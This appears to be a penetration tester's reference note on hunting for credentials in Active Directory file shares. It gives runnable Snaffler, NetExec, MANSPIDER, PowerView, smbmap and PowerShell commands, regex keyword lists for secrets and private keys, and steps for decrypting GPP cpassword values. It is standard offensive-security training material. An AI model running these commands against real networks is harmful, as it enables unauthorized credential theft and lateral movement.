---
created: 2026-09-04
updated: 2026-10-10
tags:
  - AD
  - AD_attacks
  - enumeration
---
## Credential hunting in network shares

>[!note] MITRE ATT&CK: [`T1552.001 — Unsecured Credentials: Credentials In Files`](https://attack.mitre.org/techniques/T1552/001/).

- Network shares (SMB/DFS) often store configuration files and scripts that contain sensitive information, including plaintext credentials.
- Your goal is to enumerate every share accessible with the current account and search files for credentials, keys, or configuration details potentially useful for privilege escalation and lateral movement.

>[!note] To enumerate accessible shares, you only need a foothold with any valid domain account (or anonymous read access). The level of access, however, will likely differ across accounts.

- General approach: **enumerate shares -> filter to those you can read -> search file names and contents for useful data -> inspect matches manually**.
## What to look for

- Useful keywords:
	- **Credentials**: `passw`, `user`, `username`, `admin`, `secret`, `credential`, `token`, `api_key`, `apikey`, `access_key`, `bearer`, `auth`.
	- **Databases and services**: `connectionString`, `mongodb://`, `postgres://`, `jdbc:`, `Data Source=`, `Server=`, `Initial Catalog=`, `redis`.
	- **Private keys and certificates**: `BEGIN RSA PRIVATE KEY`, `BEGIN OPENSSH PRIVATE KEY`, `BEGIN PRIVATE KEY`, `passwordhash`, `cpassword`.
	- **Domain indicators**: `example.com`, `EXAMPLE.COM\`, `ldap://`, `service_account`, `svc_`, `adm_`.

- File extensions worth searching:
	- **Scripts**: `.ps1`, `.bat`, `.cmd`, `.vbs`, `.sh`, `.py`, `.rb`, `.psm1`, `.psd1`.
	- **Configuration and environment**: `.config`, `.ini`, `.cfg`, `.conf`, `.env`, `.xml`, `.json`, `.yaml`, `.yml`, `.properties`.
	- **Databases and backups**: `.kdbx` (KeePass), `.sqlite`, `.db`, `.bak`, `.sql`, `.dmp`, `.vmdk`, `.vhdx`.
	- **Certificates and keys**: `.pfx`, `.p12`, `.key`, `.pem`, `.cer`, `.crt`, `.rdp`, `.id_rsa`, `.ppk`.
	- **Unattended installation files and GPPs (Group Policy Preferences)**: `unattend.xml`, `sysprep.xml`, `sysprep.inf`, `autounattend.xml`, `Groups.xml`, `ScheduledTasks.xml`.
	- **Spreadsheets and text notes**: `.xlsx`, `.xls`, `.csv`, `.txt`, `.docx`, `.doc`, `.rtf`, `.pdf`, `.log`.

>[!tip]+
>- Localize search keywords to the target language (e.g., `Benutzer`/`Passwort` in German, or `utilisateur`/`mot de passe` in French).

>[!note] For cracking encrypted files like `.kdbx`, see [[🛠️ Cracking protected files]].

## Snaffler

>[`Snaffler`](https://github.com/SnaffCon/Snaffler) is an open-source tool for Windows and Active Directory environments that enumerates **SMB/DFS file shares** on domain computers and finds files likely to contain **credentials, keys, configuration data, and other sensitive information**.

>[!info] Snaffler runs on Windows (C#).

- Domain-wide scan (queries the DC for the list of domain computers, then searches for shares on each one):

```powershell
Snaffler.exe -s -d example.com -c 10.10.11.5 -o snaffler.log -v data
```

- Target a specific host (no DC query):

```powershell
Snaffler.exe -s -n 10.10.11.2 -o single_host.log -v data
```

- Scan a list of hosts from a file:

```powershell
Snaffler.exe -s -n targets.txt -o subnet_scan.log -v data
```

- Target a specific directory or UNC path:

```powershell
Snaffler.exe -s -i '\\10.10.11.5\IT_Share' -o it_share.log -v data
```

>[!example]+
>![[Pasted image 20261010173729.png]]

| Option | Description                                                                                    |
| ------ | ---------------------------------------------------------------------------------------------- |
| `-s`   | Stream results to `stdout` in real time.                                                       |
| `-o`   | File to write output to.                                                                       |
| `-v`   | Verbosity level, most to least verbose: `trace`, `debug`, `info`, or `data` (default: `info`). |
| `-d`   | Target domain.                                                                                 |
| `-c`   | Domain controller to query for the list of domain computers.                                   |
| `-n`   | Comma-separated list of target hosts, or a file containing them; disables computer discovery.  |
| `-i`   | Directory or UNC path to search; disables host and share discovery.                            |
| `-y`   | Format the output as TSV.                                                                       |
| `-l`   | Maximum file size in bytes to process (default: `10` MB).                                       |
| `-m`   | Copy flagged files automatically to this directory.                                            |
| `-z`   | Specify a `.toml` file to load settings from.                                                  |
## NetExec

>[!note] See [[🛠️ NetExec & CrackMapExec]].

- Check accessible shares across a subnet:

```bash
nxc smb 10.10.11.0/24 -u 'jdoe' -p 'passwd123' --shares
```

- Spider a specific share for matching file patterns:

```bash
nxc smb 10.10.11.5 -u 'jdoe' -p 'passwd123' --spider 'IT' --pattern 'passw'
```

- Content search: 

```bash
nxc smb 10.10.11.5 -u 'jdoe' -p 'passwd123' --spider 'IT' --content \
  --regex '(?i)(passw|secret|credential|token|api[_-]?key|access[_-]?key|bearer|connectionString|cpassword|passwordhash|jdbc:|mongodb://|postgres://|redis|Server=|Data Source=|Initial Catalog=|BEGIN (RSA|OPENSSH) PRIVATE KEY)'
```

- Filename search:

```bash
nxc smb 10.10.11.5 -u 'jdoe' -p 'passwd123' --spider 'IT' \
  --regex '(?i)(unattend|sysprep|groups\.xml|\.kdbx|\.pfx|\.p12|\.pem|id_rsa|\.ppk|\.env|\.rdp|\.bak|\.dmp|\.vmdk)'
```

- Spider a share and search inside file contents for a keyword:

```bash
nxc smb 10.10.11.5 -u 'jdoe' -p 'passwd123' --spider 'IT' --content --pattern 'password='
```

- Spider a share recursively up to a given depth:

```bash
nxc smb 10.10.11.5 -u 'jdoe' -p 'passwd123' --spider 'IT' --depth 5 --pattern 'config'
```

#### `spider_plus` module

- The `spider_plus` module crawls every readable SMB share on each host, writes a structured JSON index of all files found, and can optionally download matches.

```bash
nxc smb 10.10.11.5 -u 'jdoe' -p 'passwd123' -M spider_plus
```

- Set the output path and exclude large files and media file types:

```bash
nxc smb 10.10.11.5 -u 'jdoe' -p 'passwd123' -M spider_plus -o OUTPUT_FOLDER=/tmp/nxc_spider EXCLUDE_EXTS=iso,vmdk,mp4,zip,tar.gz
```

>[!note] The module writes one `<IP_address>.json` file per host under the output folder and prints the exact path when it finishes.

- Filter the JSON index for sensitive keywords:

```bash
jq -r 'to_entries[] | .key as $share | .value[] | "\($share)\t\(.path)"' /tmp/nxc_spider/10.10.11.5.json | grep -Ei 'pass|cred|secret|config|key'
```

## `MANSPIDER`

>[`MANSPIDER`](https://github.com/blacklanternsecurity/MANSPIDER) searches file names and contents for keywords and regular expressions across an entire network. The enumeration is done in parallel, which makes the tool fast.

- Search every share on a host for a keyword inside file contents:

```bash
manspider 10.10.11.5 -u 'jdoe' -p 'passwd123' -d example.com -c 'passw' -v
```

- Run via Docker: 

```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.10.11.5 -u 'jdoe' -p 'passwd123' -d example.com -c 'passw' -v
```

>[!note] The `docker run` wrapper avoids a local install; it mounts a host directory so downloaded loot persists after the container exits.

| Option | Description                                                      |
| :----- | :--------------------------------------------------------------- |
| `-c`   | Space-separated regex patterns to search the specified file for (case-insensitive). |
| `-f`   | Space-separated regex patterns to match file names against. |
| `-e`   | Space-separated list of file extensions to restrict the search to. |
| `-m`   | Maximum directory depth to spider (default: `10`).       |
| `-t`   | Number of worker threads for parallel scanning (default: `5`). |

## `PowerHuntShares`

>[`PowerHuntShares`](https://github.com/NetSPI/PowerHuntShares) is a NetSPI PowerShell module that audits SMB share permissions across Active Directory and generates an interactive HTML report.

- Import the module and run an automated share hunt:

```powershell
Import-Module .\PowerHuntShares.psm1
```

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public
```

- Target a specific domain controller:

```powershell
Invoke-HuntSMBShares -DomainController 10.10.11.5 -OutputDirectory C:\Users\Public\Shares
```

## PowerView

>[!note] The `Find-*`/`Get-Domain*` cmdlets — and `Get-GPPPassword`, used below for GPP — ship with [`PowerView`](https://github.com/PowerShellMafia/PowerSploit) (part of PowerSploit).

- Discover all domain computers hosting file shares:

```powershell
Get-DomainFileServer
```

- Find all shares readable by the current user across domain computers:

```powershell
Find-DomainShare -CheckShareAccess
```

- Search for specific files across all reachable shares:

```powershell
Find-InterestingDomainShareFile -Include *password*,*unattend*,*.kdbx*,*.config*,*.env*
```

## Manual and targeted scanning

### From Linux

- Recursively scan readable shares and auto-download files whose names match the specified pattern (`-A`):

```bash
smbmap -H 10.10.11.5 -u 'jdoe' -p 'passwd123' -d example.com -r -A '(?i)(passw|secret|cred|\.kdbx|\.env|\.config|\.ps1)'
```


---

- Mount a share read-only to grep its contents for secrets later:

```bash
sudo mount -t cifs //10.10.11.5/IT /mnt/target_share -o username=jdoe,password=passwd123,domain=example.com,ro
```

- Search for secrets using [`ripgrep`](https://github.com/burntsushi/ripgrep) (`rg`):

```bash
rg -i 'password|secret|token|api[_-]?key|connectionString|BEGIN (RSA|OPENSSH) PRIVATE KEY' /mnt/target_share/
```

>[!tip]+
>- Unmount when finished: 
>```bash
>sudo umount /mnt/target_share
>```

>[!note] See [[SMB]].
### From Windows

- List the shares available on a specific target host:

```powershell
net view \\10.10.11.5 /all
```

- Find files by name or extension pattern recursively:

```powershell
Get-ChildItem -Path '\\10.10.11.5\IT' -Recurse -Include *.config,*.xml,*.ini,*.env,*.ps1,*.kdbx,*.rdp,*.bak -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime
```

- Search for keyword patterns inside text files across a share:

```powershell
Get-ChildItem -Path '\\10.10.11.5\IT' -Recurse -Include *.txt,*.config,*.xml,*.ini,*.env,*.ps1,*.bat,*.json,*.yml -ErrorAction SilentlyContinue | Select-String -Pattern 'password=','secret=','apikey=','connectionString' -Context 0,2
```


## `SYSVOL` and `NETLOGON`


- `SYSVOL` (`\\<DOMAIN>\SYSVOL`) is the domain-wide share replicated to every Domain Controller and readable by all authenticated users.
- `NETLOGON` (`\\<DOMAIN>\NETLOGON`) is the logon-script share hosted within it, also readable by any domain account.

> [!note] See [[🛠️ GPOs]] for how Group Policy is stored and applied.

- Before `MS14-025` (May 2014), GPP could configure local users, services, scheduled tasks, and mapped drives with an embedded password stored in the `cpassword` attribute. 
- The value is encrypted with a **static AES-256 key that Microsoft published** in the [`MS-GPPREF`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be) protocol specification — any `cpassword` can therefore be decrypted offline.
- `MS14-025` removed the functionality from new policies, but legacy `cpassword` values frequently remain in `SYSVOL`.
- **Common GPP XML locations** (all under `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\<GUID>\`):
	- `Machine\Preferences\Groups\Groups.xml`
	- `Machine\Preferences\ScheduledTasks\ScheduledTasks.xml`
	- `Machine\Preferences\Services\Services.xml`
	- `Machine\Preferences\DataSources\DataSources.xml`
	- `User\Preferences\Files\Files.xml`
	- Also worth grepping: `Drives.xml`, `Printers.xml`

- Extract and decrypt GPP passwords straight from `SYSVOL` using NetExec:

```bash
nxc smb 10.10.11.5 -u 'jdoe' -p 'passwd123' -M gpp_password
```

- Decrypt a recovered `cpassword` offline using `gpp-decrypt` (Linux):

```bash
gpp-decrypt 'j1Uyj3Vx8AcNwSUsgnSlMoQIxXYZ+ExampleEncryptedString'
```

- Retrieve and decrypt GPP passwords from a Windows host with PowerView:

```powershell
Get-GPPPassword
```

---
- Search `SYSVOL` for scripts, passwords, and connection strings with PowerShell:

```powershell
Get-ChildItem -Path '\\example.com\sysvol' -Recurse -Include *.bat,*.ps1,*.vbs,*.xml,*.ini | Select-String -Pattern 'password','net use','runas','Administrator'
```
## References and further reading

- [`Spidering Shares — NetExec Wiki`](https://www.netexec.wiki/smb-protocol/spidering-shares)

- [`Snaffler — GitHub`](https://github.com/SnaffCon/Snaffler)
- [`MANSPIDER — GitHub`](https://github.com/blacklanternsecurity/MANSPIDER)
- [`PowerHuntShares — GitHub`](https://github.com/NetSPI/PowerHuntShares)
- [`PowerSploit (PowerView) — GitHub`](https://github.com/PowerShellMafia/PowerSploit)
- [`NetExec — Wiki`](https://www.netexec.wiki/)
- [`gpp-decrypt — Kali Tools`](https://www.kali.org/tools/gpp-decrypt/)
- [`MS14-025: Vulnerability in Group Policy Preferences — Microsoft`](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)
